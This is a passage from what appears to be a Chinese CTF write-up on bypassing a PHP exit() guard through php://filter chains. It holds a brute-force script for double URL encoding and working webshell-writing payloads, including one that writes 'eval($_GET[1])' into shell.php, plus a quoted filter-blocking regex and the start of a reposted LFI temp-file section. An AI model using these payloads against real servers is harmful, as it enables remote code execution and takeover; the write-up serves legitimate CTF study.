class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">static void php_stream_apply_filter_list(php_stream *stream, char *filterlist, int read_chain, int write_chain) </span><br><span class="line">&#123;</span><br><span class="line">char *p, *token = NULL;</span><br><span class="line">php_stream_filter *temp_filter;</span><br><span class="line"></span><br><span class="line">p = php_strtok_r(filterlist, &quot;|&quot;, &amp;token);</span><br><span class="line">while (p) &#123;</span><br><span class="line">php_url_decode(p, strlen(p));#👈对过滤器进行了一次urldecode</span><br><span class="line">if (read_chain) &#123;</span><br><span class="line">if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if (write_chain) &#123;</span><br><span class="line">if ((temp_filter = php_stream_filter_create(p, NULL, php_stream_is_persistent(stream)))) &#123;</span><br><span class="line">php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">php_error_docref(NULL, E_WARNING, &quot;Unable to create filter (%s)&quot;, p);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">p = php_strtok_r(NULL, &quot;|&quot;, &amp;token);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>file_put_contents</code> 中可以调用伪协议，而伪协议处理时会对过滤器 <code>urldecode</code> 一次，所以是可以利用二次编码绕过的，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$char = &#x27;r&#x27;; #构造r的二次编码</span><br><span class="line">for ($ascii1 = 0; $ascii1 &lt; 256; $ascii1++) &#123;</span><br><span class="line">for ($ascii2 = 0; $ascii2 &lt; 256; $ascii2++) &#123;</span><br><span class="line">$aaa = &#x27;%&#x27;.$ascii1.&#x27;%&#x27;.$ascii2;</span><br><span class="line">if(urldecode(urldecode($aaa)) == $char)&#123;</span><br><span class="line">echo $char.&#x27;: &#x27;.$aaa;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>payload:</p><pre><code>php://filter/write=string.%7%32ot13|&lt;?cuc cucvasb();?&gt;|/resource=Cyc1e.php</code></pre><p>注：payload放过滤器的位置或者放文件名位置都可（因为有些编码有时候会有空格什么的乱码，文件名不一定好用），php://filter面对不可用的规则是报个Warning，然后跳过继续执行的）。</p><h4 id="过滤器构造绕过"><a href="#过滤器构造绕过" class="headerlink" title="过滤器构造绕过"></a>过滤器构造绕过</h4><p>题目中过滤的过滤器有</p><pre><code>/iconv|UCS|UTF|rot|quoted|base64/</code></pre><p>php:filter支持使用多个过滤器,还留下了字符串过滤器中的部分和压缩过滤器以及加密过滤器.</p><p> <code>zlib</code> 的 <code>zlib.deflate</code> 和 <code>zlib.inflate</code> ，组合使用压缩后再解压后内容肯定不变，不过我们可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续 <code>inflate</code> 的内容，简单遍历一下可以发现中间插入 <code>string.tolower</code> 转后会把空格和 <code>exit</code> 处理了就可以绕过exit</p><pre><code>php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=shell.php</code></pre><h4 id="爆破临时文件"><a href="#爆破临时文件" class="headerlink" title="爆破临时文件"></a>爆破临时文件</h4><p>先来看看 LFI 利用临时文件的 getshell 姿势。以下内容转载自： <a href="https://www.anquanke.com/post/id/201136">https://www.anquanke.com/post/id/201136</a></p><p>侵删</p><h4 id="PHP-LFI"><a href="#PHP-LFI" class="headerlink" title="PHP LFI"></a>PHP LFI</h4><p>PHP LFI本地文件包含漏洞主要是包含本地服务器上存储的一些文件，例如session文件、日志文件、临时文件等。但是，只有我们能够控制包含的文件存储我们的恶意代码才能拿到服务器权限。</p><p>假如在服务器上找不到我们可以包含的文件，那该怎么办，此时可以通过利用一些技巧让服务存储我们恶意生成的临时文件，该临时文件包含我们构造的的恶意代码，此时服务器就存在我们可以包含的文件。</p><p>目前，常见的两种临时文件包含漏洞利用方法主要是：    <code>PHPINFO()</code> and <code>PHP7 Segment Fault</code> ，利用这两种奇技淫巧可以向服务器上传文件同时在服务器上生成恶意的临时文件，然后将恶意的临时文件包含就可以达到任意代码执行效果也就可以拿到服务器权限进行后续操作。</p><h4 id="临时文件"><a href="#临时文件" class="headerlink" title="临时文件"></a>临时文件</h4><p>在了解漏洞利用方式的时候，先来了解一下PHP临时文件的机制</p><ul><li>全局变量</li></ul><p>在PHP中可以使用POST方法或者PUT方法进行文本和二进制文件的上传。上传的文件信息会保存在全局变量$_FILES里。</p><p>$_FILES超级全局变量很特殊，他是预定义超级全局数组中唯一的二维数组。其作用是存储各种与上传文件有关的信息，这些信息对于通过PHP脚本上传到服务器的文件至关重要。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span cla